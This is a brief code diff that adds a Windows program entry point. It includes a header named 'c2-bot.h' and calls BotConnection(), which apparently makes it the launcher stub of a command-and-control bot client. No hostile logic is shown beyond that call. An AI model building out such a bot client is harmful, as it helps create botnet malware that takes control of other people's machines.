@@ -1,0 +1,7 @@
+#include <windows.h>
+#include "c2-bot.h"
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    BotConnection();
+    return 0;
+}
